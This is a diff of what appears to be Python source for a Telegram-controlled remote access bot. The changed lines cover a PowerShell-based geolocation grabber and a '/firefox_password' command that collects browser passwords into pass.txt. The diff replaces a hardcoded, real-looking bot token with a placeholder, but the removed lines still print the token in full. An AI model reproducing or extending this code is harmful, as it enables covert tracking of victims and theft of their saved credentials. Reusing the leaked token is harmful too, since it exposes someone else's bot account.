@@ -1,4 +1,4 @@
-import socket
+
 import platform
 import sys
 import subprocess
@@ -50,12 +50,8 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 # Create a bot using the token provided by the BotFather
-updater = Updater(token='5667592239:AAGvc4ye4A_lXhjonFVFrnF8GgV7qO3ooGw', use_context=True)
-# def send(result):
-#     # Send a message
-#     context.bot.send_message(chat_id=chat_id, text=result)
-# def upload(file):
-#     context.bot.send_document(chat_id=chat_id, document=open(file, 'rb'))
+updater = Updater(token='your telegram bot token', use_context=True)
+
 
 
 # Define a function to handle incoming messages
@@ -148,12 +144,7 @@ def handle_message(update, context):
                               '$loc.position.location.horizontalaccuracy; ' \
                               '$loc.stop()' % (accuracy))
 
-            # Remove >>> $acc = [math]::Round($acc*1.5) <<< to remove accuracy builder
-            # Once removed, try setting accuracy = 10, 20, 50, 100, 1000 to see if that affects the results
-            # Note: This code will hang if your desired accuracy is too fine for your device
-            # Note: This code will hang if you interact with the Command Prompt AT ALL
-            # Try pressing ESC or CTRL-C once if you interacted with the CMD,
-            # this might allow the process to continue
+
 
             p = subprocess.Popen(pshellcomm, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  text=True)
@@ -248,12 +239,7 @@ def handle_message(update, context):
 
 
 
-    # elif command[:6] == 'upload':
-    #     try:
-    #         download_file(command[7:])
-    #     except:
-    #         pass
-
+  
     elif command[:17] == '/firefox_password':
         with open('pass.txt', 'a') as f:
             f.write('\n' + f'''if there is no password, the firefox may not be installed or profile is empty''')
